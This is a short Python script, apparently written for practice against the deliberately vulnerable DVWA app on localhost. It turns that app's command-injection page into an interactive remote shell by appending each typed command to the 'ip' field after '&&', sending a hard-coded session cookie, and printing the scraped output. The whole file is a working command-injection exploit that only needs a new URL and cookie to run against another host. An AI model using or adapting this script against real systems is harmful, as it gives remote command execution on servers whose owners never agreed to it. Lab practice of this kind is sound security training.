import requests
from bs4 import BeautifulSoup
import sys
from termcolor import colored

url = "http://localhost/DVWA-master/vulnerabilities/exec/"

cookies = {
    "__stripe_mid": "37d68129-f74e-428b-90ce-72715d2b34fa",
    "PHPSESSID": "jl8h4o0kvofc4nji8okhbjpc4e",
    "security": "low"}
while True:
    cmd = input(colored("$ ", 'green'))
    exit() if cmd == 'exit' else None

    data = {"ip": "google.com&&{}".format(cmd), "Submit": "Submit"}
    req = requests.post(url, data=data, cookies=cookies)
    soup = BeautifulSoup(req.content, 'html.parser')
    if soup.find_all('pre')[0].get_text()[477:] != "":
        output = colored(soup.find_all('pre')[0].get_text()[473:], 'green')
        sys.stdout.write(f"\r{output}")
        sys.stdout.flush()

    else:
        print(colored('command not found', 'green'))
